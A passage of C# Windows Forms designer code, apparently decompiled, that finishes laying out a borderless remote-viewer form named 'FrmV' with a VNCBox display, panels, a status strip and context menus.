			VNCBox.MouseLeave += new System.EventHandler(VNCBox_MouseLeave);
			VNCBox.MouseHover += new System.EventHandler(VNCBox_MouseHover);
			VNCBox.MouseMove += new System.Windows.Forms.MouseEventHandler(VNCBox_MouseMove);
			VNCBox.MouseUp += new System.Windows.Forms.MouseEventHandler(VNCBox_MouseUp);
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new System.Drawing.Size(1154, 632);
			base.Controls.Add(VNCBox);
			base.Controls.Add(panel4);
			base.Controls.Add(panel3);
			base.Controls.Add(panel1);
			base.Controls.Add(statusStrip1);
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Name = "FrmV";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			Text = "FrmV";
			base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(FrmV_FormClosing);
			base.Load += new System.EventHandler(FrmV_Load);
			base.KeyPress += new System.Windows.Forms.KeyPressEventHandler(FrmV_KeyPress);
			statusStrip1.ResumeLayout(false);
			statusStrip1.PerformLayout();
			guna2ContextMenuStrip2.ResumeLayout(false);
			guna2ContextMenuStrip1.ResumeLayout(false);
			guna2ContextMenuStrip3.ResumeLayout(false);
			panel1.ResumeLayout(false);
			panel1.PerformLayout();
			((System.ComponentModel.ISupportInitialize)btnClose).EndInit();
			((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
			panel4.ResumeLayout(false);
			panel4.PerformLayout();
			((System.ComponentModel.ISupportInitialize)VNCBox).EndInit();
			ResumeLayout(false);
			PerformLayout();
		}
	}
}
